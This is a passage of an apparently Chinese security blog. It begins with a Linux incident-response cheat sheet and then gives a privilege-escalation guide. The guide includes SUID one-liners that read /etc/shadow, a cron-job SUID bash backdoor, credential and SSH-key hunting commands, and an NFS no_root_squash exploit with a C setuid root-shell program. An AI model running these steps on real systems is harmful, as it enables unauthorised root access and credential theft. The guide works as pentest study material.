<h2 id="0x01-获取异常进程pid"><a href="#0x01-获取异常进程pid" class="headerlink" title="0x01 获取异常进程pid"></a>0x01 获取异常进程pid</h2><h3 id="1-CPU占用"><a href="#1-CPU占用" class="headerlink" title="1. CPU占用"></a>1. CPU占用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top -c -o %CPU</span><br><span class="line"></span><br><span class="line">-c 参数显示进程的命令行参数</span><br><span class="line">-p 参数指定进程的pid</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5</span><br><span class="line"></span><br><span class="line">cpu占用前5的进程信息</span><br></pre></td></tr></table></figure>

<h3 id="2-内存占用"><a href="#2-内存占用" class="headerlink" title="2. 内存占用"></a>2. 内存占用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top -c -o %MEM</span><br><span class="line"></span><br><span class="line">-c 参数显示进程的命令行参数</span><br><span class="line">-p 参数指定进程的pid</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head -n 5</span><br></pre></td></tr></table></figure>

<h3 id="3-网络占用"><a href="#3-网络占用" class="headerlink" title="3. 网络占用"></a>3. 网络占用</h3><p>网络占用需要安装如下软件，之后使用root权限进行执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Debian/Ubuntu </span><br><span class="line">apt-get install nethogs</span><br><span class="line"></span><br><span class="line">Centos/RHEL </span><br><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install nethogs</span><br><span class="line"></span><br><span class="line">nethogs</span><br></pre></td></tr></table></figure>

<h2 id="0x02-定位异常文件"><a href="#0x02-定位异常文件" class="headerlink" title="0x02 定位异常文件"></a>0x02 定位异常文件</h2><p><strong>根据进程名字或者部分字符串获取pid</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pidof &quot;name&quot;</span><br><span class="line"></span><br><span class="line">ps -aux | grep &quot;name&quot;</span><br><span class="line"></span><br><span class="line">ps -ef | grep &quot;name&quot; | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27;</span><br><span class="line"></span><br><span class="line">pgrep -f &quot;name&quot;</span><br></pre></td></tr></table></figure>

<p><strong>根据pid获取程序的详细信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsof -p pid</span><br><span class="line"></span><br><span class="line">pwdx pid 获取该pid的进程启动的时候的目录,并不一定是恶意文件所在的路径，只是启动恶意文件的路径</span><br><span class="line"></span><br><span class="line">systemctl status pid 获取这个进程的status信息</span><br><span class="line"></span><br><span class="line">cat /proc/pid/maps</span><br><span class="line"></span><br><span class="line">ls -al /proc/pid/exe</span><br></pre></td></tr></table></figure>

<p><strong>Tips</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有些时候无法通过ps，top等命令根据pid进行查询，可能是因为攻击者将/proc/pid/ 进行了隐藏，可以通过以下方式进行隐藏: </span><br><span class="line"></span><br><span class="line">mkdir .hidden</span><br><span class="line">mount -o bind .hidden /proc/PID</span><br><span class="line"></span><br><span class="line">这种情况可以使用 cat /proc/$$/mountinfo 来查看挂载信息</span><br></pre></td></tr></table></figure>

<p><strong>根据pid查看由进程起的线程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps H -T -p pid</span><br><span class="line"></span><br><span class="line">ps -Lf pid</span><br><span class="line"></span><br><span class="line">其中SPID就是线程ID，而CMD栏则显示了线程名称</span><br><span class="line"></span><br><span class="line">top -H -p pid -H 选项可以显示线程 </span><br><span class="line"></span><br><span class="line">pstree -acU 推荐，非常全面展示进程与线程间的关系</span><br></pre></td></tr></table></figure>

<h2 id="0x03-处理异常进程"><a href="#0x03-处理异常进程" class="headerlink" title="0x03 处理异常进程"></a>0x03 处理异常进程</h2><h3 id="1-进程查杀"><a href="#1-进程查杀" class="headerlink" title="1. 进程查杀"></a>1. 进程查杀</h3><p>有些进程会起子进程，可以使用如下命令查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps ajfx  #可以看到具体的PPID、PID、PGID、SID 信息</span><br><span class="line"></span><br><span class="line">systemctl status</span><br><span class="line"> </span><br><span class="line">kill -9 pid 这样会直接杀死指定进程，但是，由这个进程产生的子进程不会被杀死</span><br><span class="line">       </span><br><span class="line">kill -9 -pid 如果进程起子进程，可以使用此命令，这里pid前有个减号，表示杀掉这个进程组</span><br></pre></td></tr></table></figure>

<h3 id="线程查杀"><a href="#线程查杀" class="headerlink" title="线程查杀"></a>线程查杀</h3><p><strong>根据pid查看由进程起的线程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -T -p pid</span><br><span class="line">ps -aLf pid</span><br><span class="line"></span><br><span class="line">其中SPID就是线程ID，而CMD栏则显示了线程名称</span><br><span class="line"></span><br><span class="line">top -H -p pid -H 选项可以显示线程 </span><br><span class="line"></span><br><span class="line">pstree -agpU 推荐，非常全面展示进程与线程间的关系</span><br></pre></td></tr></table></figure>

<p><strong>查看全部的线程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -eLFa</span><br></pre></td></tr></table></figure>

<h2 id="0x04-清除恶意文件"><a href="#0x04-清除恶意文件" class="headerlink" title="0x04 清除恶意文件"></a>0x04 清除恶意文件</h2><blockquote>
<p>通过进程pid以及&#x2F;proc&#x2F; ,已经定位到了文件的具体位置，接下来就是删除恶意文件</p>
</blockquote>
<p><strong>查看文件占用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a 和 i 属性导致文件不可删除 </span><br><span class="line"></span><br><span class="line">a属性 文件只能增加内容，不能修改之前的文件，不能删除文件</span><br><span class="line">i属性 内容不能改变，文件不能删除 </span><br><span class="line"></span><br><span class="line">可以使用 chattr -a 和 chattr -i</span><br></pre></td></tr></table></figure>

<p><strong>文件名导致文件不可删除</strong></p>
<p>从windows向linux传输的文件或者攻击者恶意制造的文件，很多会有文件名乱码，无法直接通过乱码的文件名进行删除，可以使用inode来确定文件名，之后删除使用 inode 进行删除</p>
<p>查看inode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -li eval.sh</span><br></pre></td></tr></table></figure>

<p>删除文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find ./* -inum 12327526 -delete</span><br><span class="line"></span><br><span class="line">find ./ -inum 12327526 -exec rm &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find ./* -inum 12327526 -exec rm -i &#123;&#125; \; (会有一步确认是否删除)</span><br><span class="line"></span><br><span class="line">find ./* -inum 12327526 -exec rm -f &#123;&#125; \;(不进行确认直接强制删除)</span><br><span class="line"></span><br><span class="line">find ./* -inum 12327526 |xargs rm -f</span><br><span class="line"></span><br><span class="line">rm `find ./* -inum 12327526`</span><br></pre></td></tr></table></figure>

<h2 id="0x05-查找文件"><a href="#0x05-查找文件" class="headerlink" title="0x05 查找文件"></a>0x05 查找文件</h2><h3 id="1-locate"><a href="#1-locate" class="headerlink" title="1. locate"></a>1. locate</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-b 只搜索文件名，不搜索文件夹名 </span><br><span class="line">-i 忽略大小写 </span><br><span class="line">-r &quot;&quot; 正则匹配</span><br><span class="line"></span><br><span class="line">执行前先运行：updatedb</span><br></pre></td></tr></table></figure>

<h3 id="2-find"><a href="#2-find" class="headerlink" title="2. find"></a>2. find</h3><blockquote>
<p>find 默认文件和目录都会进行搜索，名称要准确 ，支持正则，可以使用通配符</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-type 参数指定 </span><br><span class="line"></span><br><span class="line">d 目录 </span><br><span class="line">f  文件 </span><br><span class="line">l 符号链接</span><br><span class="line">s socket</span><br></pre></td></tr></table></figure>

<p><strong>基础用法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基础使用 </span><br><span class="line">find / -name evil.sh</span><br><span class="line"></span><br><span class="line">忽略大小写 </span><br><span class="line">find / -iname evil.sh</span><br><span class="line"></span><br><span class="line">查找时排除某个/类文件 </span><br><span class="line">find / -name *evil* ! -name *.log </span><br><span class="line"></span><br><span class="line">查找时排除目录 </span><br><span class="line">find / -name *evil* -path &quot;/root/home/aaa&quot; -prune</span><br><span class="line"></span><br><span class="line">查找目录 </span><br><span class="line">find / -type d -name eval</span><br></pre></td></tr></table></figure>

<p><strong>按照权限查找文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找 777 权限的文件 </span><br><span class="line">find / -type f -perm 777</span><br><span class="line"></span><br><span class="line">查找 SUID 文件 </span><br><span class="line">find / -perm /u=s</span><br><span class="line"></span><br><span class="line">查找 SGID 文件 </span><br><span class="line">find / -perm /g=s</span><br><span class="line"></span><br><span class="line">查找 Sticky 文件 </span><br><span class="line">find / -perm /o=t</span><br></pre></td></tr></table></figure>

<p><strong>基于所有者和组查找文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找根目录下属于 root 的文件或文件夹 </span><br><span class="line">find / -user root</span><br><span class="line"></span><br><span class="line">查找ssh组的所有文件 </span><br><span class="line">find / -group ssh</span><br></pre></td></tr></table></figure>

<p><strong>基于时间进行查找</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-mtime  修改时间 </span><br><span class="line">查找最近三天修改过的文件 find / -mtime -3</span><br><span class="line">查找三天前修改过的文件 find / -mtime +3</span><br><span class="line">查找最近24小时修改过的文件 find / -mtime -1</span><br><span class="line"></span><br><span class="line">-atime  访问时间</span><br><span class="line">查找3天内访问过的文件 find / -atime -3</span><br><span class="line"></span><br><span class="line">-ctime 属性修改时间,还未发现可以修改 ctime 的常规方法，所以可以作为依据</span><br><span class="line">寻找最近三天修改过属性的文件 find / -ctime -3</span><br><span class="line"></span><br><span class="line">-daystart 按天算，不是按照24小时算， -1 表示昨天，而不是从现在往前导24小时</span><br><span class="line">寻找昨天创建的文件 find / -ctime 1 -daystart</span><br><span class="line">寻找向前3~5 天之间编辑的文件 find / -mtime 3 -mtime -5 -daystart</span><br><span class="line"></span><br><span class="line">可以使用分钟,分别对应 -mmin/-amin/-cmin </span><br><span class="line"></span><br><span class="line">查找三分钟前编辑的文件 find / -mmin +3</span><br><span class="line">查找三分钟内编辑的文件 find / -mmin -3 </span><br><span class="line">查找三分钟前访问的文件 find / -mmin +3</span><br><span class="line">查找三分钟内访问的文件 find / -mmin -3</span><br><span class="line">查找三分钟前修改属性的文件 find / -cmin +3</span><br><span class="line">找三分钟内修改属性的文件 find / -cmin -3</span><br></pre></td></tr></table></figure>

<p>按照大小寻找文件 -size ，参数后单位可以为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b  512-byte block</span><br><span class="line">c   bytes</span><br><span class="line">w  two-byte words </span><br><span class="line">k  </span><br><span class="line">M</span><br><span class="line">G</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">寻找10M的文件 find / -size 10M</span><br><span class="line"></span><br><span class="line">寻找大于10M的文件 find / -size +10M</span><br><span class="line"></span><br><span class="line">寻找小于10M的文件 find / -size -10M </span><br><span class="line"></span><br><span class="line">寻找 10M到20M之间的文件 find / -size +10MB -20M</span><br></pre></td></tr></table></figure>

<h2 id="0x06-查找文件内容"><a href="#0x06-查找文件内容" class="headerlink" title="0x06 查找文件内容"></a>0x06 查找文件内容</h2><blockquote>
<p>grep [OPTIONS] PATTERN [FILE…]</p>
</blockquote>
<p><strong>正则表达式相关参数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-E 扩展了正则表达式，支持了以下几种规则:</span><br><span class="line"></span><br><span class="line">+</span><br><span class="line">?</span><br><span class="line">a|b </span><br><span class="line">()</span><br><span class="line">x&#123;m&#125;</span><br><span class="line">x&#123;m,&#125;</span><br><span class="line">x&#123;m,n&#125;</span><br><span class="line"></span><br><span class="line">-F 该参数后的正则表达式字符串中所有字符串都没有特殊含义，仅仅是其本身</span><br><span class="line"></span><br><span class="line">-P 使用 perl 正则表达式</span><br><span class="line"></span><br><span class="line">-e 正则表达式中存在 -- 的，默认会被识别为参数，使用 -e 参数可以将 -- 认定为正则表达式中的字符</span><br><span class="line"></span><br><span class="line">-f file 从文件中加载正则</span><br><span class="line"></span><br><span class="line">-i 忽略大小写</span><br><span class="line"></span><br><span class="line">-w 只匹配完整的单词</span><br><span class="line"></span><br><span class="line">-x 匹配整行</span><br><span class="line"></span><br><span class="line">-z 跨行匹配</span><br></pre></td></tr></table></figure>

<p><strong>杂项</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s 禁止输出因文件不存在或文件没有读权限而产生的错误信息</span><br><span class="line">-v 反转结果，不显示制定的正则</span><br><span class="line">-V 版本信息</span><br></pre></td></tr></table></figure>

<p><strong>输出控制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-m NUM 匹配到NUM行后停止</span><br><span class="line">-b 打印匹配的行在文件中的字节偏移量</span><br><span class="line">-n 显示匹配的行号</span><br><span class="line">-H 批量匹配时，显示匹配的文件名，默认参数</span><br><span class="line">-h 与 H 相反，不显示文件名</span><br><span class="line">-o 只输出匹配到的字符</span><br><span class="line">-q 不显示任何东⻄</span><br><span class="line">-a 匹配二进制数据 </span><br><span class="line">-I 不匹配二进制的内容</span><br><span class="line">-d action 目录操作，读取(read)，递归(recurse)，跳过（skip)</span><br><span class="line">-D action 设置对设备，FIFO,管道的操作，读取(read)，跳过(skip)</span><br><span class="line">-r 递归,不会搜索符号连接内的内容，所以可以尽量使用 -R </span><br><span class="line">-R 递归的同时可以设置一些选项，比如排除一些目录等</span><br><span class="line">-L 显示未匹配到的文件名</span><br><span class="line">-l 只显示匹配到的文件名</span><br><span class="line">-c 打印每一个文件中匹配结果的行数</span><br></pre></td></tr></table></figure>

<p><strong>文本控制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-B &lt;NUM&gt; 显示查找到的行前的N行的内容</span><br><span class="line">-A &lt;NUM&gt; 显示查找到的行后的N行的内容 </span><br><span class="line">-C &lt;NUM&gt; 显示查找都的行前后各N行的内容</span><br></pre></td></tr></table></figure>

<p><strong>常⻅使用方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找某个文件中的字符串 </span><br><span class="line">grep &quot;str&quot; evil.sh</span><br><span class="line"> </span><br><span class="line">在某个目录中的文件中搜索某个正则表达式 </span><br><span class="line">grep &quot;str&quot; /root/xxx/*</span><br><span class="line"> </span><br><span class="line">递归在某个目录下所有文件中进行查找 </span><br><span class="line">grep -rn &quot;str&quot; /root/xxxx/</span><br><span class="line"> </span><br><span class="line">查找多个字符 </span><br><span class="line">grep &quot;str1\|str2&quot; /root/xxxx/*</span><br><span class="line">grep -E &quot;str1|str2&quot; /root/xxxx/* </span><br><span class="line">grep -e &quot;str1&quot; -e &quot;str2&quot; /root/xxxx/*</span><br><span class="line"> </span><br><span class="line">查找同时存在两个字符</span><br><span class="line">grep -E &#x27;str1.*str2&#x27; /root/xxxx/*</span><br><span class="line"> </span><br><span class="line">只搜索部分文件</span><br><span class="line">grep &#x27;abc&#x27; -r --include=*.conf /root/xxxx</span><br><span class="line">grep &#x27;abc&#x27; -r --include=&quot;*.&#123;conf,config&#125;&quot; /root/xxxx</span><br><span class="line"> </span><br><span class="line">排除部分文件</span><br><span class="line">grep &#x27;abc&#x27; --exclude=*.elf /root/xxxx</span><br><span class="line">grep &#x27;abc&#x27; --include=*.conf --exclude=*demo.conf</span><br><span class="line"> </span><br><span class="line">全盘搜索某个表达式</span><br><span class="line">grep -Rn -i &quot;str&quot; /</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Incident Response</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux提权姿势总结</title>
    <url>/posts/29809/</url>
    <content><![CDATA[<center>本文总结Linux环境下权限提升思路及方法...</center>

<span id="more"></span>
<hr>
<h2 id="0x01-SUID提权"><a href="#0x01-SUID提权" class="headerlink" title="0x01 SUID提权"></a>0x01 SUID提权</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><pre><code>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限。
</code></pre>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
<li>Linux命令查找SUID文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;</span><br><span class="line">find / -uid 0 -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用find命令以root权限命令执行</li>
</ol>
<p>Linux可以使用的命令提权姿势</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Find</span><br><span class="line">find pentestlab -exec whoami \;</span><br><span class="line"></span><br><span class="line">#Vim</span><br><span class="line">vim.tiny /etc/shadow</span><br><span class="line"></span><br><span class="line">#awk</span><br><span class="line">awk &#x27;BEGIN&#123;system(&quot;whoami&quot;)&#125;&#x27;</span><br><span class="line"></span><br><span class="line">#curl</span><br><span class="line">curl file:///etc/shadow</span><br><span class="line"></span><br><span class="line">#Bash</span><br><span class="line">bash -p  </span><br><span class="line"></span><br><span class="line">#Less</span><br><span class="line">less /etc/passwd</span><br><span class="line"></span><br><span class="line">#Nmap</span><br><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>

<h2 id="0x02-SUDO提权"><a href="#0x02-SUDO提权" class="headerlink" title="0x02 SUDO提权"></a>0x02 SUDO提权</h2><h3 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>sudo是linux系统管理指令，允许系统管理员让普通用户执行一些或者全部的root命令，如halt，reboot，su等等。sudo不是对shell的一个代替，它是面向每个命令的。</p>
<p>它的特性主要有这样几点：</p>
<ul>
<li>sudo能够限制用户只在某台主机上运行某些命令。</li>
<li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。</li>
<li>sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。</li>
<li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在&#x2F;etc&#x2F;sudoers，属性必须为0440。</li>
</ul>
<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
<li>免密码执行sudo配置</li>
</ol>
<p>linux ALL&#x3D;(ALL) ALL<br>说明：linux用户可以从  ALL终端作为  ALL（任意）用户执行，并运行  ALL（任意）命令。</p>
<ol start="2">
<li>查看sudo权限</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -v -E &quot;^#&quot; /etc/passwd 2&gt;/dev/null| awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">grep -v -e &#x27;^$&#x27; /etc/sudoers 2&gt;/dev/null |grep -v &quot;#&quot; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo &#x27;&#x27; | sudo -S -l -k 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h2 id="0x03-计划任务提权"><a href="#0x03-计划任务提权" class="headerlink" title="0x03 计划任务提权"></a>0x03 计划任务提权</h2><h3 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如果未正确配置Cron，则可以利用它获得root特权。</p>
<ol>
<li>cron作业中是否有可写的脚本或二进制文件？</li>
<li>我们可以覆盖cron文件本身吗？</li>
<li>cron.d目录可写吗？</li>
</ol>
<p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p>
<h3 id="2-漏洞利用-2"><a href="#2-漏洞利用-2" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
<li><p>查看计划任务，找到有修改权限的计划任务脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br><span class="line">more /etc/crontab</span><br></pre></td></tr></table></figure>
</li>
<li><p>在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="0x04-密码复用提权"><a href="#0x04-密码复用提权" class="headerlink" title="0x04 密码复用提权"></a>0x04 密码复用提权</h2><h3 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如数据库、后台 web 密码，其他配置文件出现的密码，可能就是 root 密码</p>
<h3 id="2-漏洞利用-3"><a href="#2-漏洞利用-3" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul>
<li>检查弱密码</li>
<li>检查Web服务器连接到数据库的文件（config.php或类似文件）</li>
<li>检查数据库以获取可能被重用的管理员密码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep --color=auto -rnw &#x27;/&#x27; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; /dev/null \;</span><br><span class="line"></span><br><span class="line">strings /dev/mem -n10 | grep -i PASS</span><br><span class="line"></span><br><span class="line">locate password | more</span><br><span class="line"></span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</span><br><span class="line"></span><br><span class="line">find / -name authorized_keys 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find / -name id_rsa 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<h2 id="0x05-NFS提权"><a href="#0x05-NFS提权" class="headerlink" title="0x05 NFS提权"></a>0x05 NFS提权</h2><h3 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。<br>Root Squashing参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程root用户在连接时会分配一个用户“ nfsnobody ”，该用户具有最小的本地权限。如果 no_root_squash 选项开启的话的话”，并为远程用户授予root用户对所连接系统的访问权限。</p>
<h3 id="2-漏洞利用-4"><a href="#2-漏洞利用-4" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
<li><p>查看配置文件&#x2F;etc&#x2F;exports</p>
</li>
<li><p>kali挂载远程目录</p>
</li>
<li><p>在&#x2F;tmp&#x2F;test文件夹下创建c文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line">#include &lt;sys/types.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt; </span><br><span class="line">int main() &#123; setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc suid-shell.c -o suid-shell</span><br></pre></td></tr></table></figure>
</li>
<li><p>回到目标主机&#x2F;tmp目录下执行suid-shell</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +s suid-shell</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>执行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./suid-shell</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Capabilities利用"><a href="#0x06-Capabilities利用" class="headerlink" title="0x06 Capabilities利用"></a>0x06 Capabilities利用</h2><h3 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>linux中Capabilities的概念和suid类似，可以让普通用户授予超级用户的能力</p>
<p><strong>Capabilities表</strong></p>
<table>
<thead>
<tr>
<th align="left">capability名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CAPAUDITCONTROL</td>
<td align="left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>
</tr>
<tr>
<td align="left">CAPAUDITREAD</td>
<td align="left">允许通过 multicast netlink 套接字读取审计日志</td>
</tr>
<tr>
<td align="left">CAPAUDITWRITE</td>
<td align="left">将记录写入内核审计日志</td>
</tr>
<tr>
<td align="left">CAPBLOCKSUSPEND</td>
<td align="left">使用可以阻止系统挂起的特性</td>
</tr>
<tr>
<td align="left">CAP_CHOWN</td>
<td align="left">修改文件所有者的权限</td>
</tr>
<tr>
<td align="left">CAPDACOVERRIDE</td>
<td align="left">忽略文件的 DAC 访问限制</td>
</tr>
<tr>
<td align="left">CAPDACREAD_SEARCH</td>
<td align="left">忽略文件读及目录搜索的 DAC 访问限制</td>
</tr>
<tr>
<td align="left">CAP_FOWNER</td>
<td align="left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>
</tr>
<tr>
<td align="left">CAP_FSETID</td>
<td align="left">允许设置文件的 setuid 位</td>
</tr>
<tr>
<td align="left">CAPIPCLOCK</td>
<td align="left">允许锁定共享内存片段</td>
</tr>
<tr>
<td align="left">CAPIPCOWNER</td>
<td align="left">忽略 IPC 所有权检查</td>
</tr>
<tr>
<td align="left">CAP_KILL</td>
<td align="left">允许对不属于自己的进程发送信号</td>
</tr>
<tr>
<td align="left">CAP_LEASE</td>
<td align="left">允许修改文件锁的 FL_LEASE 标志</td>
</tr>
<tr>
<td align="left">CAPLINUXIMMUTABLE</td>
<td align="left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>
</tr>
<tr>
<td align="left">CAPMACADMIN</td>
<td align="left">允许 MAC 配置或状态更改</td>
</tr>
<tr>
<td align="left">CAPMACOVERRIDE</td>
<td align="left">忽略文件的 DAC 访问限制</td>
</tr>
<tr>
<td align="left">CAP_MKNOD</td>
<td align="left">允许使用 mknod() 系统调用</td>
</tr>
<tr>
<td align="left">CAPNETADMIN</td>
<td align="left">允许执行网络管理任务</td>
</tr>
<tr>
<td align="left">CAPNETBIND_SERVICE</td>
<td align="left">允许绑定到小于 1024 的端口</td>
</tr>
<tr>
<td align="left">CAPNETBROADCAST</td>
<td align="left">允许网络广播和多播访问</td>
</tr>
<tr>
<td align="left">CAPNETRAW</td>
<td align="left">允许使用原始套接字</td>
</tr>
<tr>
<td align="left">CAP_SETGID</td>
<td align="left">允许改变进程的 GID</td>
</tr>
<tr>
<td align="left">CAP_SETFCAP</td>
<td align="left">允许为文件设置任意的 capabilities</td>
</tr>
<tr>
<td align="left">CAP_SETPCAP</td>
<td align="left">参考 capabilities man page</td>
</tr>
<tr>
<td align="left">CAP_SETUID</td>
<td align="left">允许改变进程的 UID</td>
</tr>
<tr>
<td align="left">CAPSYSADMIN</td>
<td align="left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>
</tr>
<tr>
<td align="left">CAPSYSBOOT</td>
<td align="left">允许重新启动系统</td>
</tr>
<tr>
<td align="left">CAPSYSCHROOT</td>
<td align="left">允许使用 chroot() 系统调用</td>
</tr>
<tr>
<td align="left">CAPSYSMODULE</td>
<td align="left">允许插入和删除内核模块</td>
</tr>
<tr>
<td align="left">CAPSYSNICE</td>
<td align="left">允许提升优先级及设置其他进程的优先级</td>
</tr>
<tr>
<td align="left">CAPSYSPACCT</td>
<td align="left">允许执行进程的 BSD 式审计</td>
</tr>
<tr>
<td align="left">CAPSYSPTRACE</td>
<td align="left">允许跟踪任何进程</td>
</tr>
<tr>
<td align="left">CAPSYSRAWIO</td>
<td align="left">允许直接访问 &#x2F;devport、&#x2F;dev&#x2F;mem、&#x2F;dev&#x2F;kmem 及原始块设备</td>
</tr>
<tr>
<td align="left">CAPSYSRESOURCE</td>
<td align="left">忽略资源限制</td>
</tr>
<tr>
<td align="left">CAPSYSTIME</td>
<td align="left">允许改变系统时钟</td>
</tr>
<tr>
<td align="left">CAPSYSTTY_CONFIG</td>
<td align="left">允许配置 TTY 设备</td>
</tr>
<tr>
<td align="left">CAP_SYSLOG</td>
<td align="left">允许使用 syslog() 系统调用</td>
</tr>
<tr>
<td align="left">CAPWAKEALARM</td>
<td align="left">允许触发一些能唤醒系统的东西(比如 CLOCKBOOTTIMEALARM 计时器)</td>
</tr>
</tbody></table>
